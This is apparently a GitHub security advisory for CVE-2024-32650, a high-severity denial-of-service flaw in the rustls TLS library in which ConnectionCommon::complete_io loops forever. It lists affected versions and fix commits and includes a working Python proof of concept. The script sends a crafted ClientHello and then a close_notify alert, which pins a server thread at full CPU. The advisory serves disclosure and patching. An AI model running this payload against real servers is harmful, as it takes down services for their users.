# [H] Denial of Service Vulnerability in Rustls Library

## Summary
Severity: High
Advisory: GHSA-6g7w-8wpp-frhj
CVE: CVE-2024-32650
CWE: CWE-835
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-04-19
Source: https://github.com/advisories/GHSA-6g7w-8wpp-frhj
Type: github-advisory

## Affected
- crates.io: `rustls` — affected >=0.23.0 <0.23.5
- crates.io: `rustls` — affected >=0.22.0 <0.22.4
- crates.io: `rustls` — affected >=0.21.0 <0.21.11
- crates.io: `rustls` — affected 0.20

## Details
### Summary
`rustls::ConnectionCommon::complete_io` could fall into an infinite loop based on network input.

### Details

Verified at `0.22` and `0.23` `rustls`, but `0.21` and `0.20` release lines are also affected. `tokio-rustls` and `rustls-ffi` do not call `complete_io` and are not affected. `rustls::Stream` and `rustls::StreamOwned` types use `complete_io` and are affected.

When using a blocking rustls server, if a client send a `close_notify` message immediately after `client_hello`, the server's `complete_io` will get in an infinite loop where:

- `eof`: false
- `until_handshaked`: true
- `self.is_handshaking()`: true
- `self.wants_write()`: false
- `self.wants_read()`: false


### PoC

1. Run simple server: `cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key`
2. Run following python script
    ```python3
    #!/usr/bin/env python3
    
    import socket
    
    sock = socket.socket()
    sock.connect(("localhost", 4443))
    
    print("Sending client hello...")
    
    # Fake handshake data of a client hello message.
    fake_handshake = """
    1603 0100 c801 0000 c403 03ec 12dd
    1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7
    a051 f03c b817 470d 4c54 c5df 7200 001c
    eaea c02b c02f c02c c030 cca9 cca8 c013
    c014 009c 009d 002f 0035 000a 0100 007f
    dada 0000 ff01 0001 0000 0000 1600 1400
    0011 7777 772e 7769 6b69 7065 6469 612e
    6f72 6700 1700 0000 2300 0000 0d00 1400
    1204 0308 0404 0105 0308 0505 0108 0606
    0102 0100 0500 0501 0000 0000 0012 0000
    0010 000e 000c 0268 3208 6874 7470 2f31
    2e31 7550 0000 000b 0002 0100 000a 000a
    0008 1a1a 001d 0017 0018 1a1a 0001 00
    """
    
    
    def parse_fake_handshake():
        i = 0
        data = bytearray()
        while i < len(fake_handshake):
            while i < len(fake_handshake) and fake_handshake[i].isspace():
                i += 1
            if i >= len(fake_handshake):
                return data
    
            c1 = fake_handshake[i]
            c2 = fake_handshake[i + 1]
            i += 2
    
            data.append(int(c1, 16) * 16 + int(c2, 16))
        return data
    
    
    data = parse_fake_handshake()
    
    print("Fake client hello:", data)
    
    sock.send(data)
    
    # Send close_notify alert that we're closing the connection.
    close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])
    print(f"close_notify is {close_data}")
    sock.send(close_data)
    print("close_notify sent")
    
    exit(0)
    ```
4. You could observe the server process get into 100% cpu usage, and if you add logging at beginning of `rustls::conn::ConnectionCommon::complete_io`, you could see the function is spinning.

Also note that the server thread is stuck in this infinite loop even if the client closes the socket.

### Impact

This is a DOS.

A multithread non-async server that uses `rustls` could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.

## References
- https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj
- https://nvd.nist.gov/vuln/detail/CVE-2024-32650
- https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d
- https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af
- https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e
- https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c
- https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e
- https://github.com/rustls/rustls
- https://rustsec.org/advisories/RUSTSEC-2024-0336.html
